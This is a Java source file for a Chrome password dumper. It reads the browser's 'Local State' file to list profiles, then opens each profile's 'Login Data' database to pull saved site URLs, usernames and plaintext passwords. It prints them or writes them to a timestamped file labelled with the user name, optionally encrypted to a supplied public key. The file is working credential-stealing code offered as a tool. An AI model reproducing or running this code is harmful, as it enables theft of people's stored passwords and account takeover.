package random.util;

import org.json.JSONObject;
import random.chrom.ChromeAccount;
import random.chrom.ChromeDatabase;
import random.chrom.ChromeProfile;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;

public class Dumper {

    private final Map<String, ChromeAccount[]> profiles;

    private Dumper(final Map<String, ChromeAccount[]> profiles) {
        this.profiles = profiles;
    }

    public static Dumper dumpAccounts() throws Exception {
        final OperatingSystem os = OperatingSystem.getOperatingSystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        final Path chromeInstall = Paths.get(os.getChromePath());
        final File chromeInfo = new File(chromeInstall.toString(), "Local State");

        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome installation not found.");
        }

        List<ChromeProfile> chromeProfiles;
        final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
        switch (OperatingSystem.getOperatingSystem()) {
            case WINDOWS:
                chromeProfiles = Dumper.readProfiles(infoLines);
                break;
            case MAC:
                final String line = infoLines[0];
                final String[] lines = line.split("\\{|\\}");
                chromeProfiles = Dumper.readProfiles(lines);
                break;
            default:
                throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }

        final Map<String, ChromeAccount[]> accounts = new HashMap<>();
        for (final ChromeProfile profile : chromeProfiles) {
            File loginData = new File(chromeInstall.toString() + File.separator + profile.getProfileName(), "Login Data");
            accounts.put(profile.getName(), Dumper.readDatabase(loginData));
        }

        if (chromeProfiles.isEmpty() || accounts.isEmpty()) {
            throw new InstantiationException("No chrome profiles found!");
        }
        return new Dumper(accounts);
    }

    private static ChromeAccount[] readDatabase(final File data) throws Exception {
        final ChromeDatabase db = ChromeDatabase.connect(data);
        final List<ChromeAccount> accounts = db.selectAccounts();
        db.close();
        return accounts.toArray(new ChromeAccount[]{});
    }

    private static List<ChromeProfile> readProfiles(String[] profilesLines) {
        List<ChromeProfile> profiles = new ArrayList<>();
        String profilesLine = profilesLines[0];
        JSONObject jsonObject = new JSONObject(profilesLine);
        JSONObject profile = (JSONObject) jsonObject.get("profile");
        JSONObject infoCache = (JSONObject) profile.get("info_cache");

        Set<String> keys = infoCache.keySet();
        for (String key : keys) {
            JSONObject userProfile = (JSONObject) infoCache.get(key);
            String name = (String) userProfile.get("user_name");
            String gaiaName = (String) userProfile.get("gaia_name");
            profiles.add(new ChromeProfile(name, gaiaName, key));
        }
        return profiles;
    }

    public int getAmountOfProfiles() {
        return profiles.keySet().size();
    }

    public void saveAccountsInfoToFile(String newFiePath, String pubKeyPath) throws IOException {

        final List<String> lines = getAccountsInfo(false);

        String savePath = newFiePath != null && !newFiePath.equals("") ? newFiePath : ".";
        File file = new File(savePath + System.getProperty("file.separator"),
                Utils.getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");

        if (file.exists()) {
            file.delete();
        }
        file.getParentFile().mkdirs();
        file.createNewFile();

        if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
            String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
            Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
        } else {
            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
        }
    }

    public void showAccountsInfo() {
        final List<String> lines = getAccountsInfo(true);
        lines.forEach(System.out::println);
    }

    public List<String> getAccountsInfo(boolean onlyWithNotEmptyPsw) {
        final List<String> lines = new ArrayList<>();

        for (final String name : profiles.keySet()) {
            final ChromeAccount[] accounts = profiles.get(name);
            lines.add("==================================================");
            lines.add(name);
            lines.add("==================================================");
            if (accounts.length > 0) {
                for (final ChromeAccount account : accounts) {
                    boolean returnInfo = onlyWithNotEmptyPsw
                            ? !account.getPassword().equals("")
                            : !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("");
                    if (returnInfo) {
                        lines.add("URL:\t\t" + account.getURL());
                        lines.add("Username:\t" + account.getUsername());
                        lines.add("Password:\t" + account.getPassword());
                        lines.add("");
                    }
                }
                lines.remove(lines.size() - 1);
            }
        }
        return lines;
    }
}
